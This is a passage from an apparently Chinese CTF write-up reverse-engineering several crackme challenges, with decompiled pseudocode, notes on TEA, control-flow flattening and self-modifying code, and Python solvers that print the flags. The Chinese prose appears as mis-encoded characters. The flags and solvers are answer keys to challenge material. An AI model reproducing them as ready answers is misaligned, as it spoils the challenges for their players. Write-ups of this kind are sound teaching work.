class="type">char</span>&gt;&gt;(refptr__ZSt4cout, <span class="string">&quot;yes yes you are right!&quot;</span>);</span><br><span class="line">    <span class="built_in">std</span>::ostream::operator&lt;&lt;(v11, refptr__ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v25 &lt;= <span class="number">32</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v12 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(refptr__ZSt4cout, <span class="string">&quot;no try again~&quot;</span>);</span><br><span class="line">    <span class="built_in">std</span>::ostream::operator&lt;&lt;(v12, refptr__ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="type">char</span>&gt;::~<span class="built_in">vector</span>(copy_flag);</span><br><span class="line">  encode::~encode(be_encoded);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;::~<span class="built_in">vector</span>(enc);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>(input_flag);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åˆ†æC++é€†å‘æ—¶<code>XXXXXXXoperatorxxx(a, b)</code> å¯ä»¥çœ‹ä½œ<code>a</code>å¯¹<code>b</code>åš<code>xxx</code>æ“ä½œ</p>
<p>å…¶ä¸­çš„ä¸»è¦é€»è¾‘æ˜¯å…ˆå¯¹be_encodedè¿›è¡Œ<code>encode</code>æ“ä½œ è¿›å…¥æŸ¥çœ‹</p>
<img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/02/23/20240223-011426-9.png" alt="image-20231107191204124" style="zoom:67%;" />

<p>éœ€è¦æ³¨æ„çš„æ˜¯ä¸»å‡½æ•°ä¸­å®šä¹‰çš„<code>be_encoded</code>å‚¨å­˜çš„æ•°æ®é•¿åº¦ä¸º1byte è€ŒC++ä¸­çš„åŒå­—ç±»å‹é•¿åº¦ä¸º4bytes æ‰€ä»¥å…¶ä¸­çš„ä¸‹æ ‡è½¬åŒ–åˆ°åŸæ¥çš„<code>be_encoded</code>ä¸­éœ€è¦ä¹˜ä¸Š4 <code>text_67</code>çš„é€»è¾‘å¾ˆç®€å•</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">text_67</span><span class="params">(__int64 be_encoded, <span class="type">char</span> now_char)</span></span><br><span class="line">&#123;</span><br><span class="line">  *(be_encoded + <span class="number">40</span>) = <span class="number">9</span>;</span><br><span class="line">  <span class="keyword">return</span> (((*(be_encoded + <span class="number">40</span>) + <span class="number">1</span>) ^ now_char) - *(be_encoded + <span class="number">40</span>) - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å‰©ä¸‹çš„å¯¹æ¯”é€»è¾‘ä¹Ÿå¾ˆç®€å• ä»¥ä¸‹æ˜¯è§£å¯†è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">enc = [<span class="literal">None</span>] * <span class="number">33</span></span><br><span class="line">enc[<span class="number">0</span>] = <span class="number">77</span></span><br><span class="line">enc[<span class="number">1</span>] = <span class="number">95</span></span><br><span class="line">enc[<span class="number">2</span>] = <span class="number">61</span></span><br><span class="line">enc[<span class="number">3</span>] = <span class="number">0x85</span></span><br><span class="line">enc[<span class="number">4</span>] = <span class="number">55</span></span><br><span class="line">enc[<span class="number">5</span>] = <span class="number">104</span></span><br><span class="line">enc[<span class="number">6</span>] = <span class="number">115</span></span><br><span class="line">enc[<span class="number">7</span>] = <span class="number">87</span></span><br><span class="line">enc[<span class="number">8</span>] = <span class="number">39</span></span><br><span class="line">enc[<span class="number">9</span>] = <span class="number">104</span></span><br><span class="line">enc[<span class="number">10</span>] = <span class="number">81</span></span><br><span class="line">enc[<span class="number">11</span>] = <span class="number">89</span></span><br><span class="line">enc[<span class="number">12</span>] = <span class="number">127</span></span><br><span class="line">enc[<span class="number">13</span>] = <span class="number">38</span></span><br><span class="line">enc[<span class="number">14</span>] = <span class="number">107</span></span><br><span class="line">enc[<span class="number">15</span>] = <span class="number">89</span></span><br><span class="line">enc[<span class="number">16</span>] = <span class="number">115</span></span><br><span class="line">enc[<span class="number">17</span>] = <span class="number">87</span></span><br><span class="line">enc[<span class="number">18</span>] = <span class="number">85</span></span><br><span class="line">enc[<span class="number">19</span>] = <span class="number">91</span></span><br><span class="line">enc[<span class="number">20</span>] = <span class="number">89</span></span><br><span class="line">enc[<span class="number">21</span>] = <span class="number">111</span></span><br><span class="line">enc[<span class="number">22</span>] = <span class="number">106</span></span><br><span class="line">enc[<span class="number">23</span>] = <span class="number">89</span></span><br><span class="line">enc[<span class="number">24</span>] = <span class="number">39</span></span><br><span class="line">enc[<span class="number">25</span>] = <span class="number">87</span></span><br><span class="line">enc[<span class="number">26</span>] = <span class="number">114</span></span><br><span class="line">enc[<span class="number">27</span>] = <span class="number">87</span></span><br><span class="line">enc[<span class="number">28</span>] = <span class="number">79</span></span><br><span class="line">enc[<span class="number">29</span>] = <span class="number">87</span></span><br><span class="line">enc[<span class="number">30</span>] = <span class="number">120</span></span><br><span class="line">enc[<span class="number">31</span>] = <span class="number">120</span></span><br><span class="line">enc[<span class="number">32</span>] = <span class="number">0x83</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(((enc[i] + <span class="number">10</span>) ^ <span class="number">10</span>) - <span class="number">10</span>), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># SYC&#123;Anma1nG_y0u_maKe_it_1alaIa~~&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="flower-or-tea-ç®€å•èŠ±æŒ‡ä»¤å’ŒTEAåŠ å¯†"><a href="#flower-or-tea-ç®€å•èŠ±æŒ‡ä»¤å’ŒTEAåŠ å¯†" class="headerlink" title="flower-or-tea | ç®€å•èŠ±æŒ‡ä»¤å’ŒTEAåŠ å¯†"></a>flower-or-tea | ç®€å•èŠ±æŒ‡ä»¤å’ŒTEAåŠ å¯†</h3><p>ExinfoæŸ¥åˆ°æ— å£³ 32ä½winç¨‹åº IDA32æ‰“å¼€ ä¼ªä»£ç å¦‚ä¸‹</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [esp+0h] [ebp-1B0h]</span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// [esp+0h] [ebp-1B0h]</span></span><br><span class="line">  <span class="type">char</span> v6; <span class="comment">// [esp+0h] [ebp-1B0h]</span></span><br><span class="line">  <span class="type">char</span> v7; <span class="comment">// [esp+0h] [ebp-1B0h]</span></span><br><span class="line">  <span class="type">int</span> v8[<span class="number">40</span>]; <span class="comment">// [esp+Ch] [ebp-1A4h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> _54; <span class="comment">// [esp+ACh] [ebp-104h]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [esp+B0h] [ebp-100h]</span></span><br><span class="line">  <span class="type">char</span> *v11; <span class="comment">// [esp+B4h] [ebp-FCh]</span></span><br><span class="line">  <span class="type">int</span> lenth; <span class="comment">// [esp+B8h] [ebp-F8h]</span></span><br><span class="line">  <span class="type">char</span> *v13; <span class="comment">// [esp+BCh] [ebp-F4h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [esp+C0h] [ebp-F0h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+C4h] [ebp-ECh]</span></span><br><span class="line">  <span class="type">int</span> v16[<span class="number">40</span>]; <span class="comment">// [esp+CCh] [ebp-E4h]</span></span><br><span class="line">  <span class="type">int</span> v17[<span class="number">4</span>]; <span class="comment">// [esp+16Ch] [ebp-44h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v18; <span class="comment">// [esp+17Ch] [ebp-34h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v19; <span class="comment">// [esp+180h] [ebp-30h]</span></span><br><span class="line">  <span class="type">char</span> input[<span class="number">40</span>]; <span class="comment">// [esp+184h] [ebp-2Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> v21; <span class="comment">// [esp+1ACh] [ebp-4h]</span></span><br><span class="line">  <span class="type">int</span> savedregs; <span class="comment">// [esp+1B0h] [ebp+0h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v17[<span class="number">0</span>] = <span class="number">32</span>;</span><br><span class="line">  v17[<span class="number">1</span>] = <span class="number">27</span>;</span><br><span class="line">  v17[<span class="number">2</span>] = <span class="number">39</span>;</span><br><span class="line">  v17[<span class="number">3</span>] = <span class="number">44</span>;</span><br><span class="line">  <span class="built_in">memset</span>(input, <span class="number">0</span>, <span class="keyword">sizeof</span>(input));</span><br><span class="line">  print(&amp;Format, v4);</span><br><span class="line">  print(&amp;byte_CA409C, v5);</span><br><span class="line">  print(&amp;byte_CA4090, v6);</span><br><span class="line">  <span class="built_in">scanf</span>(aS, input);</span><br><span class="line">  v11 = &amp;input[<span class="number">1</span>];</span><br><span class="line">  v13 = &amp;input[<span class="built_in">strlen</span>(input) + <span class="number">1</span>];</span><br><span class="line">  v10 = v13 - &amp;input[<span class="number">1</span>];</span><br><span class="line">  lenth = v13 - &amp;input[<span class="number">1</span>];</span><br><span class="line">  _54 = <span class="number">54</span>;</span><br><span class="line">  v16[<span class="number">0</span>] = <span class="number">-1694939573</span>;</span><br><span class="line">  v16[<span class="number">1</span>] = <span class="number">-1005078370</span>;</span><br><span class="line">  v16[<span class="number">2</span>] = <span class="number">-1307072749</span>;</span><br><span class="line">  v16[<span class="number">3</span>] = <span class="number">-918836760</span>;</span><br><span class="line">  v16[<span class="number">4</span>] = <span class="number">-1795955634</span>;</span><br><span class="line">  v16[<span class="number">5</span>] = <span class="number">-1244910923</span>;</span><br><span class="line">  v16[<span class="number">6</span>] = <span class="number">1146217516</span>;</span><br><span class="line">  v16[<span class="number">7</span>] = <span class="number">2055874714</span>;</span><br><span class="line">  v16[<span class="number">8</span>] = <span class="number">1405669384</span>;</span><br><span class="line">  v16[<span class="number">9</span>] = <span class="number">1846639433</span>;</span><br><span class="line">  v16[<span class="number">10</span>] = <span class="number">-1677731948</span>;</span><br><span class="line">  v16[<span class="number">11</span>] = <span class="number">1593781753</span>;</span><br><span class="line">  v16[<span class="number">12</span>] = <span class="number">401024305</span>;</span><br><span class="line">  v16[<span class="number">13</span>] = <span class="number">-541222535</span>;</span><br><span class="line">  v16[<span class="number">14</span>] = <span class="number">-1886971078</span>;</span><br><span class="line">  v16[<span class="number">15</span>] = <span class="number">1944634796</span>;</span><br><span class="line">  v16[<span class="number">16</span>] = <span class="number">-1299812186</span>;</span><br><span class="line">  v16[<span class="number">17</span>] = <span class="number">1526113129</span>;</span><br><span class="line">  v16[<span class="number">18</span>] = <span class="number">754440740</span>;</span><br><span class="line">  v16[<span class="number">19</span>] = <span class="number">880502447</span>;</span><br><span class="line">  v16[<span class="number">20</span>] = <span class="number">-1178055328</span>;</span><br><span class="line">  v16[<span class="number">21</span>] = <span class="number">-1860267729</span>;</span><br><span class="line">  v16[<span class="number">22</span>] = <span class="number">-1118163045</span>;</span><br><span class="line">  v16[<span class="number">23</span>] = <span class="number">-879332550</span>;</span><br><span class="line">  v16[<span class="number">24</span>] = <span class="number">-979801922</span>;</span><br><span class="line">  v16[<span class="number">25</span>] = <span class="number">-1610607639</span>;</span><br><span class="line">  v16[<span class="number">26</span>] = <span class="number">-1053864284</span>;</span><br><span class="line">  v16[<span class="number">27</span>] = <span class="number">-561628656</span>;</span><br><span class="line">  v16[<span class="number">28</span>] = <span class="number">-1597713004</span>;</span><br><span class="line">  v16[<span class="number">29</span>] = <span class="number">1132501052</span>;</span><br><span class="line">  v16[<span class="number">30</span>] = <span class="number">2117039688</span>;</span><br><span class="line">  v16[<span class="number">31</span>] = <span class="number">-447882103</span>;</span><br><span class="line">  v16[<span class="number">32</span>] = <span class="number">1059563152</span>;</span><br><span class="line">  v16[<span class="number">33</span>] = <span class="number">-1249037927</span>;</span><br><span class="line">  v16[<span class="number">34</span>] = <span class="number">1615521047</span>;</span><br><span class="line">  v16[<span class="number">35</span>] = <span class="number">-1668269692</span>;</span><br><span class="line">  v16[<span class="number">36</span>] = <span class="number">-186628991</span>;</span><br><span class="line">  v16[<span class="number">37</span>] = <span class="number">1022684671</span>;</span><br><span class="line">  v16[<span class="number">38</span>] = <span class="number">0</span>;</span><br><span class="line">  v16[<span class="number">39</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v13 - &amp;input[<span class="number">1</span>] == <span class="number">38</span> )                  <span class="comment">// flagé•¿åº¦ä¸º38</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( input[<span class="number">0</span>] == <span class="number">83</span> &amp;&amp; input[<span class="number">1</span>] == <span class="number">89</span> &amp;&amp; input[<span class="number">2</span>] == <span class="number">67</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( input[<span class="number">3</span>] == <span class="number">123</span> &amp;&amp; input[<span class="number">37</span>] == <span class="number">125</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; lenth / <span class="number">2</span>; ++i )</span><br><span class="line">        &#123;</span><br><span class="line">          v18 = input[i];</span><br><span class="line">          v19 = input[lenth - i - <span class="number">1</span>];</span><br><span class="line">          sub_CA10C3(_54, &amp;v18, v17);</span><br><span class="line">          v8[<span class="number">2</span> * i] = v18;                      <span class="comment">// å¥‡æ•°å…ƒç´ </span></span><br><span class="line">          v8[<span class="number">2</span> * i + <span class="number">1</span>] = v19;                  <span class="comment">// å¶æ•°å…ƒç´ </span></span><br><span class="line">        &#125;                                       <span class="comment">// target:v8 = v16</span></span><br><span class="line">        <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; lenth &amp;&amp; v8[j] == v16[j]; ++j )</span><br><span class="line">          ;</span><br><span class="line">        <span class="keyword">if</span> ( j == lenth )</span><br><span class="line">        &#123;</span><br><span class="line">          print(aYesYes, v7);</span><br><span class="line">          system(aPause_1);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          print(aWrong, v7);</span><br><span class="line">          system(aPause_2);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        print(&amp;byte_CA4060, v7);</span><br><span class="line">        system(aPause_0);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      print(aFlag, v7);</span><br><span class="line">      system(aPause_3);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    print(&amp;byte_CA407C, v7);</span><br><span class="line">    system(Command);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> sub_CA15D1(&amp;savedregs ^ v21);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ ¸å¿ƒé€»è¾‘å°±æ˜¯è¾“å…¥çš„æ•°æ®åŠ å¯†åè°ƒæ¢é¡ºåºå¹¶å’Œ<code>v16</code>æ¯”è¾ƒ è¿™ä¸ªåŠ å¯†ç®—æ³•(<code>sub_CA10C3</code>)å°±æ˜¯TEAåŠ å¯† ç‰¹ç‚¹æ˜¯æ²¡æœ‰æ•°æ®ä¸¢å¤± å¯ä»¥é€†å‘</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/02/23/20240223-145153.png" alt="image-20240223145153828"></p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯ä¼ å…¥çš„ç¬¬äºŒä¸ªå‚æ•°æ˜¯ä¸»å‡½æ•°ä¸­çš„<code>&amp;v18</code> æ‰“å¼€<code>v18</code>æ ˆä¸­çš„ä½ç½® å‘ç°<code>v19</code>å°±æ˜¯ç´§æŒ¨å…¶çš„ä¸‹ä¸€ä¸ª<img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/02/23/20240223-011426-10.png" alt="image-20231107194847453"></p>
<p>æ‰€ä»¥<code>v5 = now_char[1];</code>è¿™å¥å®é™…ä¸Šå–çš„æ˜¯<code>v19</code></p>
<p>å¦å¤–ä¸€ç‚¹éœ€è¦æ³¨æ„çš„æ˜¯æ•°æ®çš„ä¸Šé™ <code>unsigned int</code>ç±»å‹çš„æ•°æ®æœ€å¤šå‚¨å­˜4bytes æ•…æ¯æ¬¡æ‰§è¡Œéƒ½éœ€è¦æˆªå»é«˜32ä½</p>
<p>çŸ¥é“è¿™äº›åå°±å¯ä»¥å†™å‡ºä»¥ä¸‹è§£å¯†è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">key = [<span class="literal">None</span>] * <span class="number">4</span></span><br><span class="line">key[<span class="number">0</span>] = <span class="number">32</span></span><br><span class="line">key[<span class="number">1</span>] = <span class="number">27</span></span><br><span class="line">key[<span class="number">2</span>] = <span class="number">39</span></span><br><span class="line">key[<span class="number">3</span>] = <span class="number">44</span></span><br><span class="line"></span><br><span class="line">enc = [<span class="literal">None</span>] * <span class="number">38</span></span><br><span class="line">enc[<span class="number">0</span>] = <span class="number">0x9AF9464B</span></span><br><span class="line">enc[<span class="number">1</span>] = <span class="number">0xC417B89E</span></span><br><span class="line">enc[<span class="number">2</span>] = <span class="number">0xB217A713</span></span><br><span class="line">enc[<span class="number">3</span>] = <span class="number">0xC93BA9E8</span></span><br><span class="line">enc[<span class="number">4</span>] = <span class="number">0x94F3E44E</span></span><br><span class="line">enc[<span class="number">5</span>] = <span class="number">0xB5CC2AB5</span></span><br><span class="line">enc[<span class="number">6</span>] = <span class="number">0x4451E42C</span></span><br><span class="line">enc[<span class="number">7</span>] = <span class="number">0x7A8A289A</span></span><br><span class="line">enc[<span class="number">8</span>] = <span class="number">0x53C8D008</span></span><br><span class="line">enc[<span class="number">9</span>] = <span class="number">0x6E117B49</span></span><br><span class="line">enc[<span class="number">10</span>] = <span class="number">0x9BFFD794</span></span><br><span class="line">enc[<span class="number">11</span>] = <span class="number">0x5EFF2DF9</span></span><br><span class="line">enc[<span class="number">12</span>] = <span class="number">0x17E72531</span></span><br><span class="line">enc[<span class="number">13</span>] = <span class="number">0xDFBD9979</span></span><br><span class="line">enc[<span class="number">14</span>] = <span class="number">0x8F871B3A</span></span><br><span class="line">enc[<span class="number">15</span>] = <span class="number">0x73E8C5AC</span></span><br><span class="line">enc[<span class="number">16</span>] = <span class="number">0xB28670A6</span></span><br><span class="line">enc[<span class="number">17</span>] = <span class="number">0x5AF6A369</span></span><br><span class="line">enc[<span class="number">18</span>] = <span class="number">0x2CF7DA24</span></span><br><span class="line">enc[<span class="number">19</span>] = <span class="number">0x347B66AF</span></span><br><span class="line">enc[<span class="number">20</span>] = <span class="number">0xB9C84D60</span></span><br><span class="line">enc[<span class="number">21</span>] = <span class="number">0x911E912F</span></span><br><span class="line">enc[<span class="number">22</span>] = <span class="number">0xBD5A2F9B</span></span><br><span class="line">enc[<span class="number">23</span>] = <span class="number">0xCB96733A</span></span><br><span class="line">enc[<span class="number">24</span>] = <span class="number">0xC59968BE</span></span><br><span class="line">enc[<span class="number">25</span>] = <span class="number">0xA00013E9</span></span><br><span class="line">enc[<span class="number">26</span>] = <span class="number">0xC12F4EA4</span></span><br><span class="line">enc[<span class="number">27</span>] = <span class="number">0xDE863A10</span></span><br><span class="line">enc[<span class="number">28</span>] = <span class="number">0xA0C4D594</span></span><br><span class="line">enc[<span class="number">29</span>] = <span class="number">0x4380983C</span></span><br><span class="line">enc[<span class="number">30</span>] = <span class="number">0x7E2F7648</span></span><br><span class="line">enc[<span class="number">31</span>] = <span class="number">0xE54DDC89</span></span><br><span class="line">enc[<span class="number">32</span>] = <span class="number">0x3F27A690</span></span><br><span class="line">enc[<span class="number">33</span>] = <span class="number">0xB58D3199</span></span><br><span class="line">enc[<span class="number">34</span>] = <span class="number">0x604AE517</span></span><br><span class="line">enc[<span class="number">35</span>] = <span class="number">0x9C903984</span></span><br><span class="line">enc[<span class="number">36</span>] = <span class="number">0xF4E04481</span></span><br><span class="line">enc[<span class="number">37</span>] = <span class="number">0x3CF4EDFF</span></span><br><span class="line"></span><br><span class="line">flag = [<span class="literal">None</span>] * <span class="number">38</span></span><br><span class="line">lenth = <span class="number">38</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">19</span>):</span><br><span class="line">  flag[i] = enc[<span class="number">2</span> * i]</span><br><span class="line">  flag[lenth - i - <span class="number">1</span>] = enc[<span class="number">2</span> * i + <span class="number">1</span>]</span><br><span class="line">  delta = <span class="number">54</span> * <span class="number">0x31415927</span></span><br><span class="line">  <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">54</span>):</span><br><span class="line">    delta -= <span class="number">0x31415927</span></span><br><span class="line">    flag[i] -= (key[delta % <span class="number">4</span>] + delta) ^ (flag[lenth - i - <span class="number">1</span>] + ((flag[lenth - i - <span class="number">1</span>] &gt;&gt; <span class="number">5</span>) ^ (<span class="number">16</span> * flag[lenth - i - <span class="number">1</span>])))</span><br><span class="line">    flag[i] &amp;= <span class="number">0xFFFFFFFF</span></span><br><span class="line">    flag[lenth - i - <span class="number">1</span>] -= delta ^ (key[(delta &gt;&gt; <span class="number">11</span>) % <span class="number">4</span>] + delta) ^ (flag[i] + ((flag[i] &gt;&gt; <span class="number">5</span>) ^ (<span class="number">16</span> * flag[i])))</span><br><span class="line">    flag[lenth - i - <span class="number">1</span>] &amp;= <span class="number">0xFFFFFFFF</span></span><br><span class="line"><span class="keyword">for</span> each <span class="keyword">in</span> flag:</span><br><span class="line">  <span class="built_in">print</span>(<span class="built_in">chr</span>(each), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># SYC&#123;D0_Yov_1ike_To_dRink_Flow3r_teA??&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="rainbow-æ§åˆ¶æµå¹³å¦åŒ–"><a href="#rainbow-æ§åˆ¶æµå¹³å¦åŒ–" class="headerlink" title="rainbow | æ§åˆ¶æµå¹³å¦åŒ–"></a>rainbow | æ§åˆ¶æµå¹³å¦åŒ–</h3><p>å…³äºå»æ§åˆ¶æµå¹³å¦åŒ–å‚è€ƒ <a href="https://security.tencent.com/index.php/blog/msg/112">https://security.tencent.com/index.php/blog/msg/112</a></p>
<p>è¿™é‡Œç”¨åˆ«äººçš„å·¥å…·è„šæœ¬å»å¹³å¦åŒ– å»å¹³å¦åŒ–åçš„ä»£ç å¦‚ä¸‹</p>
<img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/02/23/20240223-011426-11.png" alt="image-20231107200704176" style="zoom:67%;" />

<p>ç”±äºåˆ¤æ–­æ— ç”¨å—çš„æ–¹æ³•æ˜¯æ’é™¤æ³•(æ’é™¤æ‰åºè¨€å—,åˆ†å‘å™¨,é¢„å¤„ç†å—å’Œè¿”å›å—) è€ŒåŸç¨‹åºä¸­é€€å‡ºå¹¶ä¸ä½¿ç”¨<code>return</code>è€Œæ˜¯<code>call exit</code> æ‰€ä»¥è¢«åˆ¤å®šä¸ºæ— ç”¨å—è¢«åˆ é™¤ æ•…åˆ¤æ–­é•¿åº¦å’Œflagä¸æ­£ç¡®å°±é€€å‡ºçš„å—è¢«åˆ å» è§‚å¯ŸåŸæ¥çš„ä»£ç  å‰©ä¸‹çš„ä»£ç å°±æ˜¯åŠ å¯†åçš„flagå’Œ<code>v8~v11</code>çš„æ•°æ®è¿›è¡Œå¯¹æ¯” è§£å¯†è„šæœ¬å¦‚ä¸‹</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">key = [<span class="number">101</span>,  <span class="number">88</span>,  <span class="number">65</span>, <span class="number">142</span>,  <span class="number">80</span>,  <span class="number">68</span>, <span class="number">123</span>,  <span class="number">98</span>,  <span class="number">87</span>,  <span class="number">74</span>, </span><br><span class="line">  <span class="number">126</span>,  <span class="number">84</span>,  <span class="number">73</span>, <span class="number">108</span>, <span class="number">125</span>, <span class="number">132</span>,  <span class="number">79</span>,  <span class="number">91</span>, <span class="number">149</span>,  <span class="number">96</span>, </span><br><span class="line">   <span class="number">96</span>, <span class="number">100</span>, <span class="number">119</span>,  <span class="number">72</span>, <span class="number">125</span>,  <span class="number">77</span>, <span class="number">123</span>, <span class="number">159</span>, <span class="number">104</span>,  <span class="number">60</span>, </span><br><span class="line">   <span class="number">45</span>,  <span class="number">98</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    key[i] ^= i</span><br><span class="line">    key[i] -= <span class="number">18</span> * (i % <span class="number">3</span> == <span class="number">0</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(key[i]), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># SYC&#123;TAke_1t_3asy_Just_a_STart!!&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="mySelf-ç®€å•SMC"><a href="#mySelf-ç®€å•SMC" class="headerlink" title="mySelf | ç®€å•SMC"></a>mySelf | ç®€å•SMC</h3><p>ExinfoæŸ¥åˆ°æ— å£³ 32ä½winç¨‹åº IDA32æ‰“å¼€<img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/02/23/20240223-011426-12.png" alt="image-20231108082822264" style="zoom:67%;" /></p>
<p><code>VirtualProtect</code>å‡½æ•°ç»™äºˆä¸€æ®µå†…å­˜åœ°å€(å‡½æ•°)ä¿®æ”¹è‡ªèº«å­—èŠ‚ç çš„æƒé™ åŸºæœ¬ä¸Šæ˜¯SMCçš„æ ‡å¿—</p>
<p>å¦‚æœä¸ä½¿ç”¨é™æ€åˆ†æçš„æ–¹æ³•å¯ä»¥ç›´æ¥åŠ¨æ€è°ƒè¯• è¿™æ ·çš„å¯æ“ä½œæ€§é«˜ åœ¨SMCçš„å‡½æ•°ä¸‹æ–­ç‚¹ åŠ¨æ€è°ƒè¯•åˆ°æ–­ç‚¹å¤„ F7æ­¥è¿›å‡½æ•° ä¹‹åæŸ¥çœ‹æ±‡ç¼–ä»£ç  å°†SMCåçš„å‡½æ•°é‡æ–°è¯†åˆ«ä¸ºå‡½æ•°å†åç¼–è¯‘ä¸ºä¼ªä»£ç åˆ†æ</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> __cdecl <span class="title function_">encode</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> *v6; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> *v7; <span class="comment">// [esp+10h] [ebp-8h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [esp+14h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v2 = <span class="number">0</span>;</span><br><span class="line">    v3 = *(_DWORD *)(a1 + <span class="number">4</span> * v1);</span><br><span class="line">    v7 = (<span class="type">unsigned</span> <span class="type">int</span> *)(a1 + <span class="number">4</span> * v1);</span><br><span class="line">    v6 = (<span class="type">unsigned</span> <span class="type">int</span> *)(a1 + <span class="number">4</span> * (v1 + <span class="number">1</span>));</span><br><span class="line">    v4 = <span class="number">32</span>;</span><br><span class="line">    result = *v6;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v2 -= <span class="number">1640531527</span>;</span><br><span class="line">      v3 += ((result &gt;&gt; <span class="number">5</span>) + <span class="number">2</span>) ^ (<span class="number">16</span> * result + <span class="number">2</span>) ^ (v2 + result);</span><br><span class="line">      result += ((v3 &gt;&gt; <span class="number">5</span>) + <span class="number">4</span>) ^ (<span class="number">16</span> * v3 + <span class="number">3</span>) ^ (v2 + v3);</span><br><span class="line">      --v4;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v4 